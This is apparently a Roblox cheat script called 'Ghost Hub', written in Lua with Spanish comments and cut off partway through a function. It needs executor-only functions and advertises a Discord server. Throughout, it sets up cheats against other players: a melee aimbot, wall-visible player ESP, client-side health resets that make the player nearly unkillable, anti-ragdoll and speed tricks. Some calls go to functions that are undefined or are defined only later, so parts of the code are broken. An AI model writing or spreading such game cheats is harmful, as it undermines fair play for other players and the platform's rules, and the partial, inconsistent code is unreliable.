-- ============================================================
-- GHOST HUB
-- ============================================================
do
    local TweenService = game:GetService("TweenService")
    local CoreGui      = game:GetService("CoreGui")
    local SoundService = game:GetService("SoundService")
    local Lighting     = game:GetService("Lighting")
    local Players      = game:GetService("Players")
    local LP           = Players.LocalPlayer
    if not LP then
        repeat task.wait(0.1) until Players.LocalPlayer
        LP = Players.LocalPlayer
    end
    local pgui = LP:WaitForChild("PlayerGui", 10)

    -- Limpiar guis previos
    for _, n in ipairs({"AdaptIntro", "AdaptHoneypotGui"}) do
        pcall(function() local o = CoreGui:FindFirstChild(n); if o then o:Destroy() end end)
        pcall(function() if pgui then local o = pgui:FindFirstChild(n); if o then o:Destroy() end end end)
    end

    -- ─── FUNCIÓN DE DESCARGA Y REPRODUCCIÓN (DESDE AXONIC) ───
    local function getCachedSong()
        local url = "https://files.catbox.moe/nps6gk.mp3"  -- Canción #7
        local cacheName = "AxonicSong_7.mp3"
        if isfile and isfile(cacheName) then
            return getcustomasset(cacheName)
        end
        if not writefile then return nil end
        local success, data = pcall(function() return game:HttpGet(url) end)
        if not success then return nil end
        pcall(function() writefile(cacheName, data) end)
        if isfile and isfile(cacheName) then
            return getcustomasset(cacheName)
        end
        return nil
    end

    local songAsset = getCachedSong()

    -- ─── INTRO (GHOXT ON TOP) ────────────────────────────
    local INTRO_DURATION = 3.6
    local RED           = Color3.fromRGB(255, 0, 0)
    local RED_DARK      = Color3.fromRGB(100, 0, 0)
    local RED_LIGHT     = Color3.fromRGB(255, 100, 100)
    local BLACK         = Color3.fromRGB(0, 0, 0)

    local blur = Instance.new("BlurEffect")
    blur.Size   = 0
    blur.Parent = Lighting

    local introGui = Instance.new("ScreenGui")
    introGui.Name           = "AdaptIntro"
    introGui.ResetOnSpawn   = false
    introGui.IgnoreGuiInset = true
    introGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    introGui.DisplayOrder   = 999
    pcall(function() introGui.Parent = CoreGui end)
    if not introGui.Parent then introGui.Parent = pgui end

    local tag = Instance.new("TextLabel", introGui)
    tag.Size                   = UDim2.new(0, 900, 0, 100)
    tag.Position               = UDim2.new(0.5, 0, 0.5, -20)
    tag.AnchorPoint            = Vector2.new(0.5, 0.5)
    tag.BackgroundTransparency = 1
    tag.Text                   = "Ghoxt On Top"
    tag.Font                   = Enum.Font.GothamBlack
    tag.TextSize               = 70
    tag.TextColor3             = Color3.fromRGB(255, 255, 255)
    tag.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
    tag.TextStrokeTransparency = 0.3
    tag.TextXAlignment         = Enum.TextXAlignment.Center
    tag.TextTransparency       = 1
    tag.ZIndex                 = 110

    local tagGrad = Instance.new("UIGradient", tag)
    tagGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,    RED),
        ColorSequenceKeypoint.new(0.3,  RED_DARK),
        ColorSequenceKeypoint.new(0.5,  BLACK),
        ColorSequenceKeypoint.new(0.7,  RED_DARK),
        ColorSequenceKeypoint.new(1,    RED),
    })
    tagGrad.Rotation = 0

    local line = Instance.new("Frame", introGui)
    line.Size = UDim2.new(0, 0, 0, 2)
    line.Position = UDim2.new(0.5, 0, 0.5, 50)
    line.AnchorPoint = Vector2.new(0.5, 0.5)
    line.BackgroundColor3 = RED
    line.BackgroundTransparency = 0
    line.BorderSizePixel = 0
    line.ZIndex = 110
    local lineGrad = Instance.new("UIGradient", line)
    lineGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   1),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(1,   1),
    })

    -- Enlace de Discord actualizado
    local sub = Instance.new("TextLabel", introGui)
    sub.Size                   = UDim2.new(0, 600, 0, 22)
    sub.Position               = UDim2.new(0.5, 0, 0.5, 72)
    sub.AnchorPoint            = Vector2.new(0.5, 0.5)
    sub.BackgroundTransparency = 1
    sub.Text                   = "discord.gg/qm8Mfscff"
    sub.Font                   = Enum.Font.GothamBold
    sub.TextSize               = 14
    sub.TextColor3             = Color3.fromRGB(100, 200, 255)
    sub.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
    sub.TextStrokeTransparency = 0.5
    sub.TextXAlignment         = Enum.TextXAlignment.Center
    sub.TextTransparency       = 1
    sub.ZIndex                 = 110

    -- ─── NUEVO SONIDO (desde caché o nada) ─────────────────────
    local snd = nil
    if songAsset then
        snd = Instance.new("Sound")
        snd.SoundId            = songAsset
        snd.Volume             = 0
        snd.Looped             = false
        snd.RollOffMode        = Enum.RollOffMode.InverseTapered
        snd.RollOffMinDistance = 10000
        snd.RollOffMaxDistance = 10000
        snd.Parent             = SoundService
        pcall(function() snd:Play() end)
    end

    -- Animaciones
    TweenService:Create(blur, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {Size = 12}):Play()
    if snd then
        TweenService:Create(snd, TweenInfo.new(0.5), {Volume = 0.45}):Play()
    end
    TweenService:Create(tag, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        TextTransparency = 0,
    }):Play()

    task.wait(0.3)

    TweenService:Create(line, TweenInfo.new(0.55, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 380, 0, 2),
    }):Play()
    TweenService:Create(sub, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()

    local sweepActive = true
    task.spawn(function()
        local off = -0.5
        while sweepActive do
            off = off + 0.008
            if off > 1.5 then off = -0.5 end
            tagGrad.Offset = Vector2.new(off, 0)
            task.wait()
        end
    end)

    task.wait(INTRO_DURATION - 0.5)

    sweepActive = false
    local exitInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
    TweenService:Create(tag,    exitInfo, {TextTransparency = 1}):Play()
    TweenService:Create(sub,    exitInfo, {TextTransparency = 1}):Play()
    TweenService:Create(line,   exitInfo, {Size = UDim2.new(0, 0, 0, 2), BackgroundTransparency = 1}):Play()
    if snd then
        TweenService:Create(snd, TweenInfo.new(0.6), {Volume = 0}):Play()
    end
    TweenService:Create(blur,   exitInfo, {Size = 0}):Play()

    task.wait(0.65)
    if snd then
        pcall(function() snd:Stop(); snd:Destroy() end)
    end
    pcall(function() blur:Destroy() end)
    pcall(function() introGui:Destroy() end)
end

-- ========================================================================
-- A PARTIR DE AQUÍ COMIENZA EL HUB COMPLETO (con Body Lock integrado)
-- ========================================================================

local Players, RunService, UIS, TS, Lighting, HS = game:GetService("Players"), game:GetService("RunService"), game:GetService("UserInputService"), game:GetService("TweenService"), game:GetService("Lighting"), game:GetService("HttpService")
local LP = Players.LocalPlayer
local NS, CS = 60, 29
local LAGGER_SPEED_1 = 20
local LAGGER_SPEED_2 = 10
-- Velocidades para Auto Left/Right - siempre NS
local AUTO_LAGGER_SPEED_1 = 20  -- ya no se usa, se usa NS
local AUTO_LAGGER_SPEED_2 = 10  -- ya no se usa, se usa NS
local speedMode, antiRagdollEnabled = false, false
local jumpMode = 1
local jumpEnabled = false
local tpDownMode = 1
local laggerToggled = false
local laggerLevel = 1
local medusaCounterEnabled = false
local batCounterEnabled = false
local unwalkEnabled = false
local medusaDebounce, medusaLastUsed, dropActive = false, 0, false
local autoLeftEnabled, autoRightEnabled = false, false
local autoLeftSetVisual, autoRightSetVisual = nil, nil
local speedLabel = nil
local enemySpeedLabels = {}
local autoBatEnabled = false
local autoBatSetVisual = nil
local resetAutoBatMotion = nil
local AUTO_BAT_SPEED, AUTO_BAT_VERT_SPEED, AUTO_BAT_DIST, AUTO_BAT_V_OFF = 58, 52, -2.8, 1
local ALTURA_RELATIVA = 3.5
local AUTO_BAT_TURN_SPEED = 480
local AUTO_BAT_MAX_TURN_RATE = 60
local setBatCounterVisual = nil
local startBatCounter, stopBatCounter
local antiLagEnabled = false
local removeAccessoriesEnabled = false
local autoLeftWasEnabled = false
local autoRightWasEnabled = false
local dropBrainrotWasActive = false
local dropBrainrotSetVisual = nil

-- ============================================================
-- 🚀 NUEVAS VARIABLES PARA EL TRUCO DE VELOCIDAD
-- ============================================================
local VELOCITY_Y_TRICK = 0.000026
local activeSpeedValue = NS  -- se actualizará según el modo
local isJumping = false

-- ====== ANTI RESET (ANTI-MUERTE) ======
local antiDieEnabled = false
local antiDieLoop = nil
local antiDieHealthConn = nil
local antiDieCharConn = nil
local antiDieConfig = {
    healthThreshold = 25,
    healAmount = 100,
    fallDamageProtection = true,
    ragdollProtection = true,
    invincibilityFrames = 0.5,
    autoRevive = true,
}
local lastHealTime = 0
local invincibleUntil = 0
local antiDieToggleVisual = nil

-- ====== BODY LOCK (MELEE AIMBOT) ======
local meleeAimbotEnabled = true
local MELEE_LOCK_RANGE = 150
local meleeAimbotConn = nil
local meleeToggleVisual = nil

-- ====== MÚSICA ======
local musicSounds = {}
local musicToggleSetters = {}
local musicStates = {}

local function getMeleeClosestTarget()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end

    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end

local function meleeTick()
    if not meleeAimbotEnabled then return end

    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end

    local target = getMeleeClosestTarget()
    if not target then
        if not hum.AutoRotate then hum.AutoRotate = true end
        return
    end

    local dist = (target.Position - root.Position).Magnitude
    if dist > MELEE_LOCK_RANGE then
        if not hum.AutoRotate then hum.AutoRotate = true end
        return
    end

    if hum.AutoRotate then hum.AutoRotate = false end

    local targetVel = target.AssemblyLinearVelocity
    local speed = targetVel.Magnitude
    local predictTime = math.clamp(speed / 150, 0.05, 0.2)
    local predictedPos = target.Position + targetVel * predictTime
    local flatTarget = Vector3.new(predictedPos.X, root.Position.Y, predictedPos.Z)

    local toPredict = flatTarget - root.Position
    if toPredict.Magnitude > 0.1 then
        local goalCF = CFrame.lookAt(root.Position, flatTarget)
        local diffCF = root.CFrame:Inverse() * goalCF
        local _, ry, _ = diffCF:ToEulerAnglesXYZ()
        ry = math.clamp(ry, -2.5, 2.5)
        root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(0, ry * 42, 0))
    end
end

local function startMeleeAimbot()
    if meleeAimbotConn then return end
    meleeAimbotConn = RunService.RenderStepped:Connect(meleeTick)
end

local function stopMeleeAimbot()
    if meleeAimbotConn then
        meleeAimbotConn:Disconnect()
        meleeAimbotConn = nil
    end
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum.AutoRotate = true end
    end
end

local function toggleMeleeAimbot(state)
    if state == nil then state = not meleeAimbotEnabled end
    meleeAimbotEnabled = state
    if meleeAimbotEnabled then
        startMeleeAimbot()
    else
        stopMeleeAimbot()
    end
    if meleeToggleVisual then meleeToggleVisual(state) end
    saveNow()
end

-- ============================================================

local function superHeal(hum)
    if not hum then return end
    local maxHealth = hum.MaxHealth or 100
    if hum.Health >= maxHealth and hum.Health > 0 then return end
    hum.Health = maxHealth
    invincibleUntil = tick() + antiDieConfig.invincibilityFrames
    lastHealTime = tick()
    pcall(function()
        local char = hum.Parent
        if char then
            for _, child in ipairs(char:GetChildren()) do
                if child:IsA("NumberValue") then
                    local name = child.Name:lower()
                    if name:find("health") or name:find("hp") or name:find("life") then
                        child.Value = 100
                    end
                end
            end
            if hum.Health < maxHealth then hum.Health = maxHealth end
        end
    end)
    pcall(function()
        if hum.Parent then
            for _, child in ipairs(hum.Parent:GetChildren()) do
                if child:IsA("BoolValue") and child.Name:lower():find("dead") then
                    child.Value = false
                end
            end
        end
    end)
end

local function preventDamage(root, hum)
    if not hum then return end
    if tick() < invincibleUntil then
        if hum.Health < hum.MaxHealth then hum.Health = hum.MaxHealth or 100 end
    end
    if antiDieConfig.fallDamageProtection and root then
        if root.Velocity and root.Velocity.Y < -25 then
            root.Velocity = Vector3.new(root.Velocity.X, -3, root.Velocity.Z)
            if hum.Health < hum.MaxHealth then superHeal(hum) end
        end
    end
    if antiDieConfig.ragdollProtection then
        local state = hum:GetState()
        if state == Enum.HumanoidStateType.Physics or
           state == Enum.HumanoidStateType.Ragdoll or
           state == Enum.HumanoidStateType.FallingDown then
            hum:ChangeState(Enum.HumanoidStateType.Running)
            superHeal(hum)
            if root then
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end
    if hum.Health <= 0 then
        superHeal(hum)
        hum:ChangeState(Enum.HumanoidStateType.Running)
        if root then
            root.CFrame = CFrame.new(root.Position + Vector3.new(0, 2, 0))
            root.Velocity = Vector3.zero
        end
    end
end

local function autoRevive()
    if not antiDieConfig.autoRevive then return end
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    if hum.Health <= 0 then
        superHeal(hum)
        hum:ChangeState(Enum.HumanoidStateType.Running)
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(root.Position + Vector3.new(0, 3, 0))
            root.Velocity = Vector3.zero
        end
    end
end

local function monitorHealth()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    if antiDieHealthConn then antiDieHealthConn:Disconnect(); antiDieHealthConn = nil end
    antiDieHealthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
        if hum.Health <= 0 then
            superHeal(hum)
            hum:ChangeState(Enum.HumanoidStateType.Running)
            task.wait(0.05)
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = CFrame.new(root.Position + Vector3.new(0, 3, 0))
                root.Velocity = Vector3.zero
            end
        end
    end)
end

local function startAntiDie()
    if antiDieLoop then return end
    antiDieLoop = RunService.Heartbeat:Connect(function()
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum then return end
        if hum.Health <= 0 then
            autoRevive()
            return
        end
        if hum.Health <= antiDieConfig.healthThreshold then
            superHeal(hum)
            pcall(function()
                if hum.Health < 50 then hum.Health = 100 end
            end)
        end
        preventDamage(root, hum)
        if hum.Health < 20 and hum.Health > 0 then superHeal(hum) end
        if hum.Health <= 0 then
            superHeal(hum)
            hum:ChangeState(Enum.HumanoidStateType.Running)
            if root then
                root.CFrame = CFrame.new(root.Position + Vector3.new(0, 2, 0))
                root.Velocity = Vector3.zero
            end
        end
    end)
    monitorHealth()
    if antiDieCharConn then antiDieCharConn:Disconnect(); antiDieCharConn = nil end
    antiDieCharConn = LP.CharacterAdded:Connect(function(char)
        task.wait(0.1)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            superHeal(hum)
            hum.Health = hum.MaxHealth or 100
        end
        monitorHealth()
        task.wait(0.1)
        local hum2 = char:FindFirstChildOfClass("Humanoid")
        if hum2 and hum2.Health <= 0 then
            superHeal(hum2)
            hum2.Health = hum2.MaxHealth or 100
            hum2:ChangeState(Enum.HumanoidStateType.Running)
        end
    end)
end

local function stopAntiDie()
    if antiDieLoop then
        antiDieLoop:Disconnect()
        antiDieLoop = nil
    end
    if antiDieHealthConn then
        antiDieHealthConn:Disconnect()
        antiDieHealthConn = nil
    end
    if antiDieCharConn then
        antiDieCharConn:Disconnect()
        antiDieCharConn = nil
    end
    invincibleUntil = 0
    lastHealTime = 0
end

-- ====== ANTI BAT SPIN ======
local antiBatSpinEnabled = false
local antiBatSpinConn = nil
local antiBatSpinVisual = nil
local detectDistance = 15

local function startAntiBatSpin()
    if antiBatSpinConn then return end
    antiBatSpinConn = RunService.Heartbeat:Connect(function()
        if not antiBatSpinEnabled then
            stopAntiBatSpin()
            return
        end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end

        local currentTool = char:FindFirstChildOfClass("Tool")
        local holdingBat = currentTool and currentTool.Name:lower():find("bat")
        if holdingBat then return end

        local threat = false
        for _, other in pairs(Players:GetPlayers()) do
            if other ~= LP and other.Character then
                local otherRoot = other.Character:FindFirstChild("HumanoidRootPart")
                if otherRoot then
                    if (root.Position - otherRoot.Position).Magnitude <= detectDistance then
                        threat = true
                        break
                    end
                end
            end
        end

        local spin = root:FindFirstChild("AxonicAntiBat")
        if threat then
            if not spin then
                local bv = Instance.new("BodyAngularVelocity")
                bv.Name = "AxonicAntiBat"
                bv.MaxTorque = Vector3.new(0, math.huge, 0)
                bv.AngularVelocity = Vector3.new(0, 50, 0)
                bv.Parent = root
                hum.AutoRotate = false
            end
        elseif spin then
            spin:Destroy()
            hum.AutoRotate = true
        end
    end)
end

local function stopAntiBatSpin()
    if antiBatSpinConn then
        antiBatSpinConn:Disconnect()
        antiBatSpinConn = nil
    end
    local char = LP.Character
    if char then
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            local spin = root:FindFirstChild("AxonicAntiBat")
            if spin then spin:Destroy() end
        end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum.AutoRotate = true end
    end
end

-- ====== RAGDOLL TIMER ======
local ragdollTimerEnabled = false
local ragdollTimerConn = nil
local ragdollCharacterAddedConn = nil
local hitCountdownActive = false
local hitCountdownToken = 0
local hitCountdownLabel = nil
local numberSizeMultiplier = 0.5
local setRagdollTimerVisual = nil

local function setupRagdollBillboard(char)
    if not char then return end
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
    if not head then return end
    local old = head:FindFirstChild("HitCountdownBB")
    if old then old:Destroy() end
    local bb = Instance.new("BillboardGui")
    bb.Name = "HitCountdownBB"
    bb.Size = UDim2.new(0, 180 * numberSizeMultiplier, 0, 60 * numberSizeMultiplier)
    bb.StudsOffset = Vector3.new(0, 5, 0)
    bb.AlwaysOnTop = true
    bb.Parent = head
    local lbl = Instance.new("TextLabel")
    lbl.Name = "Countdown"
    lbl.Size = UDim2.new(1, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = ""
    lbl.Visible = false
    lbl.TextScaled = true
    lbl.Font = Enum.Font.GothamBold
    lbl.TextColor3 = Color3.fromRGB(180, 210, 255)
    lbl.TextStrokeTransparency = 0
    lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    lbl.Parent = bb
    hitCountdownLabel = lbl
end

local function startRagdollCountdown()
    if hitCountdownActive then return end
    if not hitCountdownLabel or not hitCountdownLabel.Parent then
        setupRagdollBillboard(LP.Character)
    end
    if not hitCountdownLabel then return end
    hitCountdownActive = true
    hitCountdownToken = hitCountdownToken + 1
    local token = hitCountdownToken
    local lbl = hitCountdownLabel
    task.spawn(function()
        lbl.Visible = true
        for i = 3, 1, -1 do
            if token ~= hitCountdownToken then return end
            lbl.Text = tostring(i)
            task.wait(1)
        end
        if token ~= hitCountdownToken then return end
        lbl.Text = "GO!"
        repeat
            task.wait(0.1)
            local char = LP.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hum then break end
            local state = hum:GetState()
            if state ~= Enum.HumanoidStateType.Physics and state ~= Enum.HumanoidStateType.Ragdoll and state ~= Enum.HumanoidStateType.FallingDown then
                break
            end
        until false
        if token ~= hitCountdownToken then return end
        task.wait(0.25)
        lbl.Visible = false
        lbl.Text = ""
        hitCountdownActive = false
    end)
end

local function startRagdollTimer()
    if not ragdollTimerEnabled then return end
    if ragdollTimerConn then return end
    if LP.Character then setupRagdollBillboard(LP.Character) end
    if not ragdollCharacterAddedConn then
        ragdollCharacterAddedConn = LP.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            setupRagdollBillboard(char)
        end)
    end
    ragdollTimerConn = RunService.Heartbeat:Connect(function()
        if not ragdollTimerEnabled then
            stopRagdollTimer()
            return
        end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local state = hum:GetState()
        if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
            startRagdollCountdown()
        end
    end)
end

local function stopRagdollTimer()
    if ragdollTimerConn then
        ragdollTimerConn:Disconnect()
        ragdollTimerConn = nil
    end
    if ragdollCharacterAddedConn then
        ragdollCharacterAddedConn:Disconnect()
        ragdollCharacterAddedConn = nil
    end
    if hitCountdownLabel then
        hitCountdownLabel.Visible = false
        hitCountdownLabel.Text = ""
    end
    hitCountdownActive = false
    hitCountdownToken = hitCountdownToken + 1
end

-- ====== DIMENSIONES DE BOTONES FLOTANTES (CUADRADOS CON BORDES REDONDOS) ======
local MOBILE_BTN_W = 60
local MOBILE_BTN_H = 60
local MOBILE_GAP = 8
local MOBILE_ROW_GAP = 10
local MOBILE_COLS = 2
local MOBILE_CORNER_RADIUS = 12

-- ====== STRETCH ======
local stretchEnabled = false
local stretchFOV = 110
local stretchConn = nil
local stretchFovConn = nil
local origFOV = 70

local medusaAutoResetEnabled = false
local medusaResetConns = {}
local setMedusaAutoResetVisual = nil

-- ====== GALAXY SKY ======
local galaxySkyEnabled = false
local galaxySkyObject = nil
local originalLighting = {}

-- ====== PLAYER ESP ======
local espEnabled = false
local espFolder = nil
local espConnections = {}
local espToggleVisual = nil

-- ============================================================
-- 🔥 FUNCIÓN DE GUARDADO RÁPIDO
-- ============================================================
local function saveNow()
    pcall(saveAllSettings)
end

-- ====== GALAXY SKY FUNCTIONS ======
local function enableGalaxySky()
    if galaxySkyObject then return end
    originalLighting.Brightness = Lighting.Brightness
    originalLighting.ClockTime = Lighting.ClockTime
    originalLighting.ExposureCompensation = Lighting.ExposureCompensation
    originalLighting.OutdoorAmbient = Lighting.OutdoorAmbient

    if Lighting:FindFirstChild("NgasGalaxySky") then
        Lighting.NgasGalaxySky:Destroy()
    end
    local sky = Instance.new("Sky")
    sky.Name = "NgasGalaxySky"
    sky.SkyboxBk = "rbxassetid://159454299"
    sky.SkyboxDn = "rbxassetid://159454296"
    sky.SkyboxFt = "rbxassetid://159454293"
    sky.SkyboxLf = "rbxassetid://159454286"
    sky.SkyboxRt = "rbxassetid://159454289"
    sky.SkyboxUp = "rbxassetid://159454291"
    sky.Parent = Lighting
    galaxySkyObject = sky

    Lighting.Brightness = 0
    Lighting.ClockTime = 0
    Lighting.ExposureCompensation = -2
    Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
    galaxySkyEnabled = true
end

local function disableGalaxySky()
    if galaxySkyObject then
        galaxySkyObject:Destroy()
        galaxySkyObject = nil
    end
    if originalLighting.Brightness ~= nil then
        Lighting.Brightness = originalLighting.Brightness
        Lighting.ClockTime = originalLighting.ClockTime
        Lighting.ExposureCompensation = originalLighting.ExposureCompensation
        Lighting.OutdoorAmbient = originalLighting.OutdoorAmbient
        originalLighting = {}
    end
    galaxySkyEnabled = false
end

local function toggleGalaxySky(state)
    if state == nil then state = not galaxySkyEnabled end
    if state then enableGalaxySky() else disableGalaxySky() end
    if setGalaxySkyVisual then setGalaxySkyVisual(state) end
    saveNow()
end

-- ====== FUNCIONES ESP ======
local function hideRobloxName(character)
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
    end
end

local function createESP(player)
    if player == LP then return end
    local character = player.Character
    if not character then return end
    local root = character:FindFirstChild("HumanoidRootPart")
    local head = character:FindFirstChild("Head")
    if not root or not head then return end

    hideRobloxName(character)

    local old = espFolder:FindFirstChild(player.Name)
    if old then old:Destroy() end

    local holder = Instance.new("Folder")
    holder.Name = player.Name
    holder.Parent = espFolder

    local box = Instance.new("BoxHandleAdornment")
    box.Name = "Box"
    box.Adornee = root
    box.AlwaysOnTop = true
    box.ZIndex = 5
    box.Size = Vector3.new(4, 6, 2)
    box.Transparency = 0.45
    box.Color3 = Color3.fromRGB(0, 0, 255)
    box.Parent = holder

    local shimmer = Instance.new("BoxHandleAdornment")
    shimmer.Name = "Shimmer"
    shimmer.Adornee = root
    shimmer.AlwaysOnTop = true
    shimmer.ZIndex = 10
    shimmer.Size = Vector3.new(4, 6, 2)
    shimmer.Transparency = 0.8
    shimmer.Color3 = Color3.new(1, 1, 1)
    shimmer.Parent = holder

    task.spawn(function()
        while holder.Parent do
            shimmer.Transparency = 0.65 + 0.35 * math.sin(tick() * 3)
            task.wait(0.05)
        end
    end)

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "Info"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 140, 0, 40)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = holder

    local image = Instance.new("ImageLabel")
    image.Size = UDim2.new(0, 28, 0, 28)
    image.Position = UDim2.new(0, 0, 0.5, -14)
    image.BackgroundTransparency = 1
    image.Parent = billboard

    local thumb = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
    image.Image = thumb

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = image

    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, -35, 1, 0)
    text.Position = UDim2.new(0, 35, 0, 0)
    text.BackgroundTransparency = 1
    text.Text = player.Name
    text.TextColor3 = Color3.fromRGB(255, 255, 255)
    text.TextStrokeTransparency = 0
    text.TextScaled = true
    text.Font = Enum.Font.GothamBold
    text.Parent = billboard
end

local function removeESP(player)
    local esp = espFolder and espFolder:FindFirstChild(player.Name)
    if esp then esp:Destroy() end
end

local function enableESP()
    if espEnabled then return end
    espEnabled = true
    if espToggleVisual then espToggleVisual(true) end

    espFolder = Instance.new("Folder")
    espFolder.Name = "PlayerESP"
    espFolder.Parent = CoreGui

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP then
            if player.Character then
                createESP(player)
            end
            espConnections[player] = player.CharacterAdded:Connect(function()
                task.wait(1)
                createESP(player)
            end)
        end
    end

    espConnections["PlayerAdded"] = Players.PlayerAdded:Connect(function(player)
        espConnections[player] = player.CharacterAdded:Connect(function()
            task.wait(1)
            createESP(player)
        end)
    end)

    espConnections["PlayerRemoving"] = Players.PlayerRemoving:Connect(function(player)
        removeESP(player)
        if espConnections[player] then
            espConnections[player]:Disconnect()
            espConnections[player] = nil
        end
    end)

    saveNow()
end

local function disableESP()
    if not espEnabled then return end
    espEnabled = false
    if espToggleVisual then espToggleVisual(false) end

    if espFolder then
        espFolder:Destroy()
        espFolder = nil
    end

    for key, conn in pairs(espConnections) do
        if conn and type(conn) == "RBXScriptConnection" then
            pcall(conn.Disconnect, conn)
        end
        espConnections[key] = nil
    end
    espConnections = {}

    saveNow()
end

local function toggleESP(state)
    if state == nil then state = not espEnabled end
    if state then enableESP() else disableESP() end
end

-- ====== LIMPIEZA TOTAL ======
local function stopAllBackgroundTasks()
    if movementLoop then movementLoop:Disconnect(); movementLoop = nil end
    if steppedConn then steppedConn:Disconnect(); steppedConn = nil end
    if enemySpeedConn then enemySpeedConn:Disconnect(); enemySpeedConn = nil end
    if stretchEnabled then disableStretch() end
    if stretchConn then stretchConn:Disconnect(); stretchConn = nil end
    if stretchFovConn then stretchFovConn:Disconnect(); stretchFovConn = nil end
    stopAntiRagdoll()
    stopJumpMode()
    stopBatCounter()
    stopMedusaCounter()
    stopMedusaAutoReset()
    stopAutoTPDown()
    disableAutoBat()
    stopBypassAimbot()
    stopAutoLeft()
    stopAutoRight()
    if unwalkEnabled then stopUnwalk() end
    if antiLagEnabled then disableAntiLag() end
    if dropActive then stopDropBrainrot() end
    stopAntiBatSpin()
    stopRagdollTimer()
    if espEnabled then disableESP() end
    if antiDieEnabled then stopAntiDie() end
    stopMeleeAimbot()
    for _, t in ipairs(dropConnections) do
        if type(t) == "thread" then pcall(task.cancel, t)
        elseif type(t) == "RBXScriptConnection" then pcall(t.Disconnect, t) end
    end
    dropConnections = {}
    dropActive = false
    _hittingCooldown = false
    bypassHittingCooldown = false
    alPhase = 1
    arPhase = 1
    lastDropTime = 0
    medusaDebounce = false
    medusaLastUsed = 0
    stopAutoSteal()
    if galaxySkyEnabled then disableGalaxySky() end
    -- Detener música
    for _, snd in ipairs(musicSounds) do
        pcall(function() snd:Stop(); snd:Destroy() end)
    end
    musicSounds = {}
end

local function setMedusaCounterState(state)
    medusaCounterEnabled = state
    if state then
        if medusaAutoResetEnabled then
            medusaAutoResetEnabled = false
            if setMedusaAutoResetVisual then setMedusaAutoResetVisual(false) end
            stopMedusaAutoReset()
        end
        if LP.Character then setupMedusa(LP.Character) else stopMedusaCounter() end
    else
        stopMedusaCounter()
    end
    if setMedusaVisual then setMedusaVisual(state) end
    saveNow()
end

local function setMedusaAutoResetState(state)
    medusaAutoResetEnabled = state
    if state then
        if medusaCounterEnabled then
            medusaCounterEnabled = false
            if setMedusaVisual then setMedusaVisual(false) end
            stopMedusaCounter()
        end
        if LP.Character then setupMedusaAutoReset(LP.Character) else stopMedusaAutoReset() end
    else
        stopMedusaAutoReset()
    end
    if setMedusaAutoResetVisual then setMedusaAutoResetVisual(state) end
    saveNow()
end

local cursedResetRemote = nil
local CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
local instaResetKeybind = {kb = Enum.KeyCode.G, gp = nil}
local setInstaResetVisual = nil
local instaResetFloatingButton = nil
local instaResetFloatingPos = nil
local insta_reset_cooldown = false

local function insta_reset()
    if insta_reset_cooldown then return end
